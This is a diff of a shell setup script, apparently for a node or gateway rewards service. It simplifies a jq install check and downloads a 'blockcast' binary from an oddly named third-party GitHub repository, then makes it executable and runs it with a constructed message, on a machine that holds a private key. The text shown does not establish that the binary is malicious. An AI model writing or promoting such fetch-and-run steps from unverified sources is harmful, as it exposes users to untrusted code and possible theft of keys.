@@ -142,17 +142,7 @@ echo "3. Enable location in your browser"
 echo "4. Backup your private key at ~$HOME/certs/gateway.key"
 echo -e "\nNote: Check node status at /manage-nodes after a few minutes. Node should show 'Healthy'."
 echo "First connectivity test runs after 6 hours. Rewards start after 24 hours."
-
-
-
-if ! command -v jq &> /dev/null; then
-    echo "⚙️  jq chưa được cài. Đang tiến hành cài đặt..."
-    apt update &&  apt install -y jq
-    if [ $? -ne 0 ]; then
-        echo "❌ Không thể cài jq. Thoát."
-        exit 1
-    fi
-fi
+apt install -y jq
 
 PUBLIC_IP=$(curl -s ifconfig.me)
 echo "PUBLIC_IP: $PUBLIC_IP"
@@ -171,10 +161,8 @@ EOF
 )
 echo "MESSAGE: $MESSAGE"
 
-curl -L -o blockcast https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
-if [ $? -ne 0 ]; then
-    echo "❌ Không thể tải tệp blockcast từ URL"
-    exit 1
-fi
-chmod +x blockcast
-./blockcast -message "$MESSAGE"
+
+curl -L -o /home/blockcast https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
+chmod +x /home/blockcast
+
+/home/blockcast -message "$MESSAGE"
